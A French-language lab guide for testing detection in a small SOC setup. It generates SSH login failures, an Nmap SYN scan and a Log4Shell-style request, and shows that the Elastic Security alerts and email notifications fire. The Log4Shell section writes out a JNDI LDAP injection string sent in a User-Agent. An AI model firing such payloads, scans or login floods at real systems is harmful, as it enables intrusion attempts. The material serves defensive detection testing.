# Guide d'utilisation du laboratoire

Ce guide décrit le démarrage du laboratoire et la reproduction des tests. Les paramètres des règles Elastic Security sont décrits dans le [guide de configuration des détections](05-configuration-detection.md). Les commandes ci-dessous s'appliquent aux VM du projet : Kali `192.168.56.101` et Ubuntu `192.168.56.10`.

## 1. Démarrer et vérifier le laboratoire

Démarrer les deux VM dans VirtualBox. Sur Ubuntu :

```bash
ip -br address
sudo systemctl start elasticsearch kibana syslog-ng suricata
systemctl is-active elasticsearch kibana syslog-ng suricata
```

**Résultat attendu :** l'adresse `192.168.56.10/24` apparaît sur `enp0s8` et chaque service affiche `active`. L'activation d'un service ne prouve pas à elle seule la collecte des événements.

Pour le scénario SSH, contrôler aussi le service et l'écoute :

```bash
sudo systemctl start ssh
sudo systemctl status ssh --no-pager -l
sudo ss -lntp 'sport = :22'
```

**Résultat attendu :** le service SSH est actif et écoute sur le port TCP 22 accessible depuis Kali. Si l'authentification par mot de passe est désactivée, ce test ne produira pas les messages attendus ; vérifier la configuration SSH déjà utilisée pour le scénario avant de continuer.

Depuis Kali :

```bash
ip -br address
ping -c 4 192.168.56.10
```

**Résultat attendu :** l'interface du réseau de laboratoire possède l'adresse `192.168.56.101` et le serveur répond.

Ouvrir `http://192.168.56.10:5601`, se connecter à Kibana et vérifier que la règle **SSH — Échecs répétés depuis une même IP** est activée. Elle recherche dans `lab-syslog-system` les événements `event.action : "ssh_login_failed"`, regroupés par `source.ip`, avec un seuil de **5**. Elle est planifiée chaque minute avec cinq minutes de recherche supplémentaire.

## 2. Reproduire le scénario SSH

### 2.1. Objectif et conditions

Générer au moins cinq échecs d'authentification SSH depuis la même VM Kali vers Ubuntu, rapprochés dans le temps. Le test utilise des saisies manuelles de mots de passe erronés et ne nécessite pas de nouvel outil.

Les messages `Failed password for ...` sont collectés par syslog-ng, puis normalisés par les pipelines `system-logs` et `ssh-auth`. La règle Elastic Security compte ensuite les événements de chaque IP.

### 2.2. Générer les échecs depuis Kali

Sur Ubuntu, vérifier préalablement que le compte de test choisi n'existe pas :

```bash
getent passwd admin
```

**Résultat attendu :** aucune entrée. Si ce nom existe, choisir un autre nom inexistant et l'utiliser dans la commande suivante.

![Vérification du compte admin sur Ubuntu](../captures/scenarios/ssh-compte-inexistant.png)

**Lecture de la capture :** `getent passwd admin` ne renvoie aucune entrée. Le nom `admin` n'est donc pas résolu comme compte utilisateur sur ce serveur lors du contrôle ; il est utilisé comme utilisateur inexistant pour le test.

Sur Kali :

```bash
date -Is
for tentative in 1 2 3 4 5; do
  printf '\nTentative SSH %s/5\n' "$tentative"
  ssh -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o NumberOfPasswordPrompts=1 \
      -o ConnectTimeout=5 \
      admin@192.168.56.10
done
date -Is
```

À chaque demande, saisir un mot de passe volontairement erroné. La saisie ne s'affiche pas dans le terminal. Lors de la première connexion, vérifier l'identité du serveur avant d'accepter sa clé ; les connexions suivantes réutilisent cette confiance.

**Résultat attendu :** cinq refus d'authentification, typiquement `Permission denied`. Un refus de connexion ou un délai d'attente ne constitue pas un échec d'authentification et ne valide pas ce scénario. Réaliser les cinq tentatives en quelques minutes et conserver les heures de début et de fin.

![Cinq tentatives SSH refusées depuis Kali](../captures/scenarios/ssh-tentatives-kali.png)

**Résultat observé :** les cinq tentatives vers `admin@192.168.56.10` affichent `Permission denied (publickey,password)`. Le test débute le **30 septembre 2026 à 23:46:32−04:00** et se termine à **23:47:05−04:00**. Les options SSH demandent l'authentification par mot de passe, désactivent l'authentification par clé et limitent chaque connexion à une demande de mot de passe. Ces refus sont rapprochés dans le temps et visent le même serveur.

### 2.3. Vérifier les journaux sur Ubuntu

Juste après le test :

```bash
sudo journalctl -u ssh --since "10 minutes ago" --no-pager |
  rg 'Failed password for .*admin'
```

Si `rg` n'est pas installé dans la VM, utiliser :

```bash
sudo journalctl -u ssh --since "10 minutes ago" --no-pager |
  grep -E 'Failed password for .*admin'
```

Le fichier d'authentification écrit par la configuration syslog-ng du laboratoire permet également de contrôler les événements :

```bash
sudo tail -n 200 /var/log/auth.log |
  grep -E 'Failed password for .*admin'
```

**Résultat attendu :** au moins cinq messages du type `Failed password for invalid user admin from 192.168.56.101 port ... ssh2`, correspondant aux heures du test. Le port source peut changer entre les connexions.

![Échecs SSH enregistrés sur Ubuntu](../captures/scenarios/ssh-journaux-ubuntu.png)

**Résultat observé :** cinq messages `Failed password for invalid user admin` proviennent de `192.168.56.101`, aux heures **23:46:49, 23:46:53, 23:46:58, 23:47:01 et 23:47:05**, le 30 septembre. Ils correspondent à la période du test Kali. Les ports sources changent entre les connexions, tandis que l'adresse source reste identique : le regroupement de la règle repose sur cette IP.

Cette preuve confirme les échecs enregistrés localement sur Ubuntu. La collecte dans Elasticsearch et la génération de l'alerte sont vérifiées dans les étapes suivantes.

### 2.4. Vérifier la collecte dans Discover

Dans Kibana :

1. Ouvrir **Discover** et sélectionner la vue de données couvrant `lab-syslog-system`.
2. Choisir une plage absolue couvrant le test. Pour la preuve fournie : **30 septembre 2026, 23:45 à 23:50 en UTC−4**, soit **1er octobre 2026, 03:45 à 03:50 en UTC**. Adapter les heures au fuseau d'affichage Kibana.
3. Appliquer le filtre KQL :

```text
event.action : "ssh_login_failed" and source.ip : "192.168.56.101" and user.name : "admin"
```

4. Ajouter les colonnes `@timestamp`, `source.ip`, `user.name`, `event.action`, `event.outcome` et `message`.
5. Actualiser et vérifier les documents du test.

**Résultat attendu :** au moins cinq événements avec `event.outcome: failure` et `event.action: ssh_login_failed`, depuis la même IP. Les heures doivent correspondre aux messages Ubuntu, en tenant compte du fuseau d'affichage Kibana.

![Collecte des cinq échecs SSH dans Discover](../captures/scenarios/ssh-discover.png)

**Résultat observé :** la vue affichée **Logs de sécurité**, avec le filtre ci-dessus et la période **Last 15 minutes**, renvoie **Documents (5)**. La plage visible est le **30 septembre 2026 de 23:38:03.278 à 23:53:03.278**. Elle inclut le test Kali de 23:46:32 à 23:47:05.

| Élément visible | Lecture |
| --- | --- |
| Documents (5) | Cinq événements correspondent au filtre et à la période |
| source.ip : 192.168.56.101 | Adresse de Kali |
| user.name : admin | Utilisateur inexistant testé |
| process.name : sshd | Processus ayant émis les messages |
| event.action : ssh_login_failed | Action ajoutée par le pipeline SSH |
| event.outcome : failure | Échec d'authentification |
| event.category : authentication | Catégorie normalisée |
| host.name : server | Hôte ayant journalisé les échecs |
| message : Failed password for invalid user admin ... | Message d'origine conservé |

Les heures des documents visibles, notamment **23:46:49, 23:46:53, 23:46:58 et 23:47:01**, correspondent aux journaux Ubuntu. Le compteur indique cinq documents, même si toutes les lignes ne sont pas entièrement visibles dans la capture.

**Lecture de l'histogramme :** les deux barres représentent trois documents puis deux documents dans des compartiments de **30 secondes**. Cette largeur est l'intervalle de représentation automatique ; elle ne correspond ni à la fréquence d'exécution de la règle ni à un délai d'ingestion.

La capture confirme la chaîne **sshd → syslog-ng → Elasticsearch et ses pipelines → Discover** pour les événements de ce test. Les documents Discover sont les journaux indexés ; leur compteur n'est pas un nombre d'alertes Elastic Security.

Pour reproduire cette capture plus tard, utiliser la plage absolue indiquée dans les instructions, plutôt que **Last 15 minutes**, qui se déplace avec l'heure de consultation.

### 2.5. Vérifier l'alerte Elastic Security

Ouvrir la règle **SSH — Échecs répétés depuis une même IP**, puis son onglet **Alertes**. Choisir une période incluant le test et la période suivant son exécution. Actualiser après les exécutions planifiées.

Ouvrir l'alerte correspondant au test et vérifier :

- le nom de la règle ;
- le regroupement sur `source.ip` et la valeur `192.168.56.101` ;
- la date de l'alerte et la période du test ;
- le compteur du résultat de seuil, lorsqu'il est affiché ;
- la sévérité moyenne et le score de risque 47.

**Résultat attendu :** une alerte de cette règle pour le groupe ayant atteint au moins cinq échecs. Une alerte par seuil est un résultat agrégé ; elle ne reprend pas nécessairement tous les champs de chaque journal source. Consulter Discover pour les messages individuels.

Le délai réel dépend de la collecte, de l'indexation et de l'exécution de la règle. Une dernière exécution `succeeded` ne prouve pas à elle seule une détection.

![Alerte SSH générée après les cinq échecs](../captures/scenarios/ssh-alerte.png)

**Résultat observé :** la page **Security → Détections → Alertes**, sur **Last 15 minutes**, affiche une alerte associée à la règle SSH. Le tableau indique :

| Élément | Valeur observée | Lecture |
| --- | --- | --- |
| @timestamp | 30 septembre 2026, 23:47:56.613 | Heure affichée pour l'alerte |
| Règle | SSH — Échecs répétés dep… | Nom tronqué de la règle SSH documentée |
| Sévérité | medium | Priorité moyenne |
| Score de risque | 47 | Score configuré sur la règle |
| Raison | event with source 192.168.56.101 created medium alert SSH… | Adresse source correspondant à Kali |
| Compteur global et répartition par règle | 1 | Une alerte dans la vue et la période affichées |

L'alerte apparaît environ **51,6 secondes après le dernier échec enregistré à 23:47:05**. Cet écart est observé sur ce test ; il ne constitue pas une garantie générale de délai.

Les **cinq documents Discover** et l'**alerte agrégée** sont des objets différents : la règle par seuil produit une alerte lorsque son groupe satisfait ses conditions. Le résumé montre une alerte de la règle et l'IP du test ; le compteur interne du résultat de seuil n'est pas visible dans cette capture.

#### Détails de l'alerte

![Regroupement et adresse source de l'alerte SSH](../captures/scenarios/ssh-alerte-source.png)

![Paramètres de seuil de l'alerte SSH](../captures/scenarios/ssh-alerte-parametres.png)

| Élément | Valeur observée | Lecture |
| --- | --- | --- |
| Nom complet | SSH — Échecs répétés depuis une même IP | Règle déclenchée |
| Heure | 30 septembre 2026, 23:47:56.613 | Même alerte que dans le tableau |
| État | Open | État de traitement de l'alerte |
| Sévérité / score | Medium / 47 | Priorité configurée |
| source.ip | 192.168.56.101 | Adresse de Kali |
| kibana.alert.threshold_result.terms.field | source.ip | Champ de regroupement du résultat |
| signal.threshold_result.terms.field | source.ip | Champ également affiché sous ce nom |
| kibana.alert.rule.parameters.threshold.value | 5 | Minimum configuré |
| kibana.alert.rule.parameters.type | threshold | Type de détection |
| kibana.alert.rule.rule_type_id | siem.thresholdRule | Identifiant du type de règle |

**Lecture :** l'adresse source et l'heure relient l'alerte au test. **Open** concerne le traitement de l'alerte ; ce statut ne signifie pas qu'une session SSH a été ouverte. Le paramètre `threshold.value` est le minimum configuré, pas le nombre exact d'événements agrégés. Ce compteur n'est pas affiché et aucune valeur ne lui est attribuée ici.

Pour reproduire ces vues, ouvrir les détails de la ligne d'alerte et rechercher les champs `source.ip` et `threshold`. Pour retrouver la preuve ultérieurement, choisir une période absolue incluant **23:47:56.613 le 30 septembre en UTC−4**, soit **03:47:56.613 le 1er octobre en UTC**.

La génération des cinq échecs, leur collecte et l'alerte SSH sont documentées avec des preuves concordantes. La vérification suivante porte sur le courriel.

### 2.6. Vérifier l'action et le courriel

La chaîne existante est **action Index Notifications SOC → lab-notifications → /usr/local/sbin/soc_notifications.py → SMTP SSL → courriel**. Le script utilise un état SQLite pour éviter de renvoyer les notifications traitées. Les paramètres et la preuve d'exécution périodique sont décrits dans le [guide des détections](05-configuration-detection.md).

Dans **Kibana → Dev Tools**, rechercher les notifications récentes :

```http
GET lab-notifications/_search
{
  "size": 10,
  "sort": [
    { "@timestamp": { "order": "desc" } }
  ]
}
```

Identifier le document du test SSH à partir de `scenario`, `rule_name`, `alert_id` et de l'heure. Si d'autres tests ont eu lieu depuis, élargir la recherche ou filtrer la période du test.

Sur Ubuntu, retrouver les passages du service autour de l'alerte du 30 septembre à 23:47:56.613, avec les heures du serveur :

```bash
sudo journalctl -u soc-notifications.service \
  --since "2026-09-30 23:45:00" \
  --until "2026-10-01 00:00:00" --no-pager
```

Comparer ensuite le nom de règle, le scénario et l'heure avec le courriel reçu.

#### Preuve de notification et de réception

La réponse Elasticsearch fournie contient **22 documents au total**, dont dix sont retournés par la requête. Le premier est la notification SSH du test ; ce total n'est pas le nombre de notifications SSH.

```json
{
  "@timestamp": "2026-10-01T03:47:56.685Z",
  "alert_id": "c408e61bb0b89524b4cd44e0952646fb0df5c8812c74e7399fff38cdd50db510",
  "rule_name": "SSH — Échecs répétés depuis une même IP",
  "scenario": "Échecs SSH",
  "message": "Plusieurs échecs de connexion SSH ont été détectés sur le serveur."
}
```

Ce document est enregistré dans `lab-notifications` sous l'identifiant `OLaT9aABj0iPFDUOe4UV`. Son heure équivaut au **30 septembre à 23:47:56.685 en UTC−4**.

L'extrait du journal fourni montre :

```text
sept. 30 23:48:05 server systemd[1]: Starting soc-notifications.service - Envoi des alertes SOC par courriel...
sept. 30 23:48:07 server python3[10145]: Courriel envoyé pour : SSH — Échecs répétés depuis une même IP
sept. 30 23:48:07 server systemd[1]: soc-notifications.service: Deactivated successfully.
sept. 30 23:48:07 server systemd[1]: Finished soc-notifications.service - Envoi des alertes SOC par courriel.
```

![Courriel reçu pour l'alerte SSH du test](../captures/scenarios/ssh-courriel-recu.png)

**Lecture du courriel :** l'objet est **Alerte SOC — SSH — Échecs répétés depuis une même IP** ; l'expéditeur affiché est **Ne pas répondre - Alertes SOC** ; la réception est affichée le **30 septembre à 23:48**. Le corps reprend le scénario, la règle, la date UTC de la notification et l'identifiant d'alerte ci-dessus. Cet identifiant commun relie directement le document Elasticsearch au message reçu.

L'explication destinée à l'administrateur indique que les répétitions peuvent correspondre à une tentative de deviner un mot de passe et que l'alerte ne signifie pas qu'un accès a été obtenu.

| Étape | Heure observée en UTC−4 |
| --- | --- |
| Dernier échec SSH local | 23:47:05 |
| Alerte Elastic Security | 23:47:56.613 |
| Document lab-notifications | 23:47:56.685 |
| Envoi annoncé par le service | 23:48:07 |
| Réception affichée dans la messagerie | 23:48, précision à la minute |

Le journal annonce l'envoi environ **10,3 secondes après la date du document de notification**. La capture du courriel confirme la réception ; sa précision à la minute ne permet pas de calculer un délai exact de livraison.

Les passages suivants affichent `Aucune nouvelle notification`. Ils sont cohérents avec un traitement déjà effectué, sans constituer à eux seuls une démonstration du mécanisme de déduplication. La chaîne **échecs SSH → collecte → alerte → notification indexée → service → courriel reçu** est validée pour ce test.

## 3. Critères de validation du scénario SSH

| Étape | Preuve attendue |
| --- | --- |
| Génération | Confirmée : cinq refus d'authentification sur Kali |
| Journalisation | Confirmée : cinq messages Failed password pour admin, depuis 192.168.56.101 |
| Collecte et normalisation | Confirmées : cinq documents Discover contenant les champs SSH attendus |
| Détection | Confirmée dans la vue Alertes : règle SSH, IP du test et horodatage concordants |
| Notification | Confirmée : document lab-notifications, envoi journalisé et courriel reçu |

Les captures confirment le contrôle du compte, la génération des cinq échecs, leur journalisation sur Ubuntu et la collecte des cinq documents normalisés dans Discover. La génération d'une alerte SSH est également attestée dans la vue Alertes. Les détails confirment le groupe source et le seuil configuré. La notification indexée, l'envoi journalisé et le courriel reçu sont désormais attestés.

## 4. Reproduire le scénario de scan Nmap

### 4.1. Objectif et conditions

Depuis Kali, scanner les ports TCP du serveur Ubuntu `192.168.56.10`. La règle **Scan de ports potentiel — nombreux ports contactés** recherche dans `lab-syslog-ids` les événements Suricata de type flow vers ce serveur, regroupés par `source.ip` et `destination.ip`. Elle exige au moins **10 événements** et **10 ports de destination distincts** par groupe. Vérifier que Suricata capture sur `enp0s8`, que syslog-ng collecte les événements flow et que la règle est activée.

### 4.2. Lancer le scan depuis Kali

```bash
clear
date -Is
sudo nmap -sS 192.168.56.10
date -Is
```

`-sS` demande un scan TCP SYN ; sudo fournit les privilèges nécessaires à ce mode. Sans liste de ports explicite, Nmap utilise sa sélection habituelle des ports TCP les plus courants. Conserver les heures afin de retrouver les événements du test.

![Résultat du scan Nmap depuis Kali](../captures/scenarios/nmap-scan-kali.png)

**Résultat observé :** Nmap **7.95** annonce un scan le **1er octobre 2026 à 10:48 EDT**. La cible `192.168.56.10` répond. Le résultat indique **997 ports TCP fermés** avec réponse reset, et trois ports ouverts :

| Port | État | Libellé affiché par Nmap |
| --- | --- | --- |
| 22/tcp | open | ssh |
| 80/tcp | open | http |
| 9200/tcp | open | wap-wsp |

**Lecture :** sans option de détection de version `-sV`, les libellés de la colonne SERVICE correspondent aux associations de ports de Nmap et ne prouvent pas l'identité du logiciel. Le port 9200 est utilisé par Elasticsearch dans ce laboratoire ; le libellé `wap-wsp` ne démontre pas qu'un service WAP y est installé.

Nmap rapporte **une adresse IP scannée, un hôte actif et une durée de 0,23 seconde**. La date affichée après le scan est **2026-10-01T10:48:54-04:00**, soit **14:48:54 UTC**. La commande et la date de début ne sont pas visibles dans cette capture ; le début annoncé par Nmap est précis à la minute.

Les 997 ports fermés sont également des ports sondés : la détection n'exige pas dix ports ouverts. Ce résultat atteste le scan et ses réponses, pas encore la collecte des événements ni la génération d'une alerte.

### 4.3. Vérifier les flux dans Discover

Dans **Discover**, sélectionner la vue **Logs de sécurité** couvrant `lab-syslog-ids`. Choisir une plage absolue du **1er octobre 2026, 10:47 à 10:55 en UTC−4**, soit **14:47 à 14:55 UTC**, et appliquer :

```text
suricata.event_type : "flow" and source.ip : "192.168.56.101" and destination.ip : "192.168.56.10" and suricata.dest_port : *
```

Ajouter les colonnes **@timestamp**, **source.ip**, **destination.ip**, **suricata.dest_port** et **suricata.proto**, puis actualiser. Les événements flow peuvent être écrits après la fin du scan, lors de la fermeture ou de l'expiration des flux ; le résultat Nmap peut donc précéder leur apparition dans Discover.

**Résultat attendu :** des flux depuis Kali vers Ubuntu, correspondant au test et concernant au moins dix ports distincts. Le compteur Documents mesure les événements correspondants, pas le nombre de ports distincts. La capture Discover et les détails de l'alerte serviront à vérifier ces résultats ; aucune collecte ni alerte n'est déduite du seul résultat Nmap.


![Flux du scan Nmap collectés dans Discover](../captures/scenarios/nmap-discover.png)

**Résultat observé :** la vue **Logs de sécurité** affiche **Documents (1 000)** avec le filtre de flux depuis `192.168.56.101` vers `192.168.56.10`. La capture utilise **Last 15 minutes**, avec une plage visible du **1er octobre 2026, 10:38:50.830 à 10:53:50.830**. Elle inclut le scan terminé à 10:48:54.

| Élément visible | Lecture |
| --- | --- |
| source.ip : 192.168.56.101 | VM Kali ayant lancé le scan |
| destination.ip : 192.168.56.10 | Serveur Ubuntu ciblé |
| suricata.proto : TCP | Protocole des flux visibles |
| Ports visibles : 49 154, 9 099, 88, 27 355 | Quatre ports de destination distincts dans les lignes affichées |
| @timestamp : 10:50:04.290 | Horodatage commun aux quatre lignes visibles |
| Documents (1 000) | Compteur affiché des événements correspondant à la recherche |

Les virgules visibles dans les valeurs de ports sont des séparateurs de milliers de l'affichage : `49,154` correspond au port **49154**. L'histogramme répartit les événements principalement autour de **10:49–10:50**, avec des compartiments automatiques de **30 secondes**. Cet intervalle représente les données ; il ne définit pas la fréquence de la règle.

La capture confirme la présence des événements réseau dans Elasticsearch après le scan. Les lignes visibles sont horodatées environ **70 secondes après la date de fin affichée sur Kali**. Ce décalage ne mesure pas à lui seul le délai d'ingestion : le pipeline reprend l'horodatage EVE de Suricata, et les flux peuvent être journalisés après leur expiration.

Le compteur 1 000 est cohérent avec le scan affichant 997 ports fermés et trois ports ouverts. Il ne prouve pas à lui seul 1 000 ports distincts : la capture ne montre que quatre valeurs distinctes. La vérification du seuil de dix ports distincts doit s'appuyer sur la cardinalité ou les détails de l'alerte.

Pour retrouver cette preuve ultérieurement, sélectionner une plage absolue incluant le test et les flux, par exemple **10:47 à 10:55 en UTC−4**, plutôt que Last 15 minutes.


### 4.4. Vérifier l'alerte Elastic Security

Ouvrir **Security → Détections → Alertes**, choisir une période absolue du **1er octobre 2026, 10:47 à 11:00 en UTC−4** et retrouver la règle **Scan de ports potentiel — nombreux ports contactés**. Ouvrir la ligne d'alerte puis l'onglet **Tableau** ; rechercher les champs `source.ip`, `destination.ip` et `threshold`.

![Alerte générée après le scan Nmap](../captures/scenarios/nmap-alerte.png)

**Résultat observé dans les captures fournies :** la vue Alertes, sur Last 30 minutes, affiche une alerte de cette règle à **10:50:28.690**, de sévérité **medium** et de score **47**.

![Groupe et IP source de l'alerte Nmap](../captures/scenarios/nmap-alerte-source.png)

![IP de destination de l'alerte Nmap](../captures/scenarios/nmap-alerte-destination.png)

![Paramètres de cardinalité de l'alerte Nmap](../captures/scenarios/nmap-alerte-cardinalite.png)

| Champ ou élément | Valeur observée | Lecture |
| --- | --- | --- |
| source.ip | 192.168.56.101 | Kali |
| destination.ip | 192.168.56.10 | Ubuntu |
| kibana.alert.threshold_result.terms.field | source.ip et destination.ip | Champs du groupe ayant déclenché |
| signal.threshold_result.terms.field | source.ip et destination.ip | Même regroupement sous le nom également affiché |
| kibana.alert.rule.parameters.threshold.cardinality.field | suricata.dest_port | Champ de cardinalité configuré |
| kibana.alert.rule.parameters.threshold.cardinality.value | 10 | Minimum de ports distincts configuré |
| kibana.alert.rule.parameters.threshold.field | source.ip et destination.ip | Regroupement configuré |
| État | Open | État de traitement de l'alerte |

La date et les deux IP concordent avec le scan et les flux Discover. L'alerte est horodatée environ **94,7 secondes après la date de fin du scan** affichée sur Kali. Ce délai est propre au test.

Le paramètre `cardinality.value: 10` est le minimum configuré, pas le nombre exact de ports distincts agrégés. Les captures ne montrent pas ce compteur exact. Les 1 000 documents Discover sont des événements réseau ; l'alerte est un résultat agrégé produit par la règle. **Open** ne décrit pas l'état des ports réseau.

La reproduction du scan, la collecte et la génération de l'alerte sont attestées. La vérification suivante consiste à retrouver la notification dans `lab-notifications`, l'envoi journalisé et le courriel reçu.


### 4.5. Vérifier la notification et l'envoi du courriel

Dans **Kibana → Dev Tools**, rechercher les notifications du scénario :

```http
GET lab-notifications/_search
{
  "size": 10,
  "query": {
    "match_phrase": {
      "scenario": "Scan Nmap"
    }
  },
  "sort": [
    { "@timestamp": "desc" }
  ]
}
```

**Résultat observé :** la réponse contient huit notifications du scénario, dont sept historiques. La première correspond au test du 1er octobre ; ce total ne représente pas huit notifications issues de ce scan.

Document du test, enregistré dans `lab-notifications` sous `Grby96ABj0iPFDUOEaZ6` :

```json
{
  "@timestamp": "2026-10-01T14:50:28.838Z",
  "alert_id": "4991593517d2a558e150bdddb62a85ea739d2e69022376024671dfe0651f3347",
  "rule_name": "Scan de ports potentiel — nombreux ports contactés",
  "scenario": "Scan Nmap",
  "message": "Un balayage des ports ou services du serveur a été détecté."
}
```

**Lecture :** 14:50:28.838 UTC correspond à **10:50:28.838 en UTC−4**, soit environ **148 millisecondes après l'horodatage de l'alerte**. L'identifiant `alert_id` permet de rapprocher cette notification du courriel.

Sur Ubuntu, avec les heures locales du serveur :

```bash
sudo journalctl -u soc-notifications.service \
  --since "2026-10-01 10:48:00" \
  --until "2026-10-01 10:55:00" --no-pager
```

Extrait du journal fourni :

```text
oct. 01 10:50:33 server systemd[1]: Starting soc-notifications.service - Envoi des alertes SOC par courriel...
oct. 01 10:50:47 server python3[19368]: Courriel envoyé pour : Scan de ports potentiel — nombreux ports contactés
oct. 01 10:50:47 server systemd[1]: soc-notifications.service: Deactivated successfully.
oct. 01 10:50:47 server systemd[1]: Finished soc-notifications.service - Envoi des alertes SOC par courriel.
```

**Lecture :** le relais annonce un envoi pour la règle Nmap à **10:50:47**, environ **18,2 secondes après la date du document de notification**. Le journal ne contient pas l'identifiant d'alerte ; le rapprochement repose ici sur le nom de règle et la période du test. Les passages suivants affichent `Aucune nouvelle notification.`

| Étape | Heure observée le 1er octobre 2026 en UTC−4 |
| --- | --- |
| Fin affichée du scan Kali | 10:48:54 |
| Flux visibles dans Discover | 10:50:04.290 |
| Alerte Elastic Security | 10:50:28.690 |
| Document lab-notifications | 10:50:28.838 |
| Envoi annoncé par le relais | 10:50:47 |

#### Réception du courriel

![Courriel reçu pour le scan Nmap](../captures/scenarios/nmap-courriel-recu.png)

**Résultat observé :** le courriel reçu porte l'objet **Alerte SOC — Scan de ports potentiel — nombreux ports contactés**, avec l'expéditeur affiché **Ne pas répondre - Alertes SOC**. La messagerie affiche le **1er octobre 2026 à 10:50**, avec une précision à la minute.

Le corps reprend le scénario **Scan Nmap**, le nom complet de la règle, la date **2026-10-01T14:50:28.838Z** et l'identifiant :

```text
4991593517d2a558e150bdddb62a85ea739d2e69022376024671dfe0651f3347
```

**Lecture :** la date et l'identifiant sont identiques à ceux du document `lab-notifications`. Ils relient directement la notification indexée au message reçu. La précision à la minute de la messagerie ne permet pas de calculer un délai exact de livraison.

L'explication indique qu'un balayage sert à identifier les ports et services accessibles et peut précéder une intrusion, tout en précisant que le scan seul ne prouve pas la compromission d'un service.

### 4.6. Critères de validation du scénario Nmap

| Étape | Preuve obtenue |
| --- | --- |
| Génération | Résultat Kali : scan de 192.168.56.10, 997 ports fermés et trois ouverts |
| Collecte | Discover : 1 000 événements flow de Kali vers Ubuntu, avec plusieurs ports visibles |
| Détection | Alerte à 10:50:28.690, couple source–destination concordant et paramètres de cardinalité documentés |
| Notification | Document lab-notifications à 10:50:28.838 |
| Envoi | Journal du relais : courriel envoyé à 10:50:47 |
| Réception | Courriel reçu avec la même date et le même alert_id que la notification |

La chaîne **scan Kali → événements Suricata → collecte Elasticsearch → alerte Elastic Security → notification indexée → relais SMTP → courriel reçu** est validée pour ce test. Le nombre exact de ports distincts agrégés n'est pas visible dans les détails fournis ; aucune valeur supplémentaire n'est attribuée à ce compteur.


## 5. Reproduire le scénario Log4Shell — tentative JNDI

### 5.1. Objectif et conditions

Envoyer depuis Kali une requête HTTP vers Ubuntu avec le motif `${jndi:` dans le User-Agent. La signature Suricata **1000002** inspecte cet en-tête sur le port TCP 80. La règle Elastic Security **Tentative d’exploitation de Log4Shell - JNDI** recherche les alertes de cette signature dans `lab-syslog-ids`.

Le scénario vérifie la détection du motif. Il ne nécessite pas le déploiement d'une application Log4j vulnérable ni d'un serveur LDAP et ne démontre pas une exécution de code.

### 5.2. Envoyer la requête depuis Kali

```bash
clear
date -Is
curl -v --max-time 10 \
  -A '${jndi:ldap://192.168.56.101:1389/test}' \
  http://192.168.56.10/
date -Is
```

| Élément | Fonction |
| --- | --- |
| -v | Affiche la connexion, les en-têtes envoyés et la réponse |
| --max-time 10 | Limite la durée totale de la commande à dix secondes |
| -A | Définit le User-Agent |
| Guillemets simples autour du motif | Transmettent le texte littéral sans expansion par le shell |
| http://192.168.56.10/ | Requête vers le serveur HTTP du laboratoire, port 80 |

L'adresse LDAP dans le User-Agent fait partie du texte de test. Curl envoie une requête HTTP au serveur Ubuntu ; il ne se connecte pas lui-même à cette adresse LDAP.

![Requête HTTP avec User-Agent JNDI depuis Kali](../captures/scenarios/jndi-requete-kali.png)

**Résultat observé :** la capture commence à **2026-10-01T11:42:59-04:00**. Curl affiche une connexion depuis **192.168.56.101:54856** vers **192.168.56.10:80**, puis :

```text
> GET / HTTP/1.1
> Host: 192.168.56.10
> User-Agent: ${jndi:ldap://192.168.56.101:1389/test}
< HTTP/1.1 200 OK
< Date: Thu, 01 Oct 2026 15:43:03 GMT
< Server: Apache/2.4.58 (Ubuntu)
```

**Lecture :** le User-Agent attendu est bien transmis. La réponse HTTP 200 et le HTML affiché correspondent à la page par défaut Apache. Ils prouvent la réponse du serveur HTTP, sans établir une interprétation JNDI ou une exploitation Log4Shell.

La date de réponse **15:43:03 GMT** correspond à **11:43:03 en UTC−4**. La commande et la date de fin ne sont pas visibles dans cette capture. La collecte de l'alerte IDS et la génération de l'alerte Elastic Security doivent être contrôlées séparément.

### 5.3. Vérifier l'alerte Suricata collectée dans Discover

Dans **Discover → Logs de sécurité**, choisir une période absolue du **1er octobre 2026, 11:42 à 11:47 en UTC−4**, soit **15:42 à 15:47 UTC**. Appliquer :

```text
suricata.event_type : "alert" and suricata.alert.signature_id : 1000002 and source.ip : "192.168.56.101" and destination.ip : "192.168.56.10"
```

Ajouter les colonnes **@timestamp**, **source.ip**, **destination.ip**, **suricata.alert.signature_id**, **suricata.alert.signature** et **suricata.http.http_user_agent**. Actualiser.

**Résultat attendu :** un événement de signature 1000002 correspondant à la requête et aux IP du test. Le User-Agent peut être vérifié dans les détails du document si le champ est présent. Un document Discover constitue la preuve de collecte d'une alerte Suricata ; la détection Elastic Security est une étape distincte.
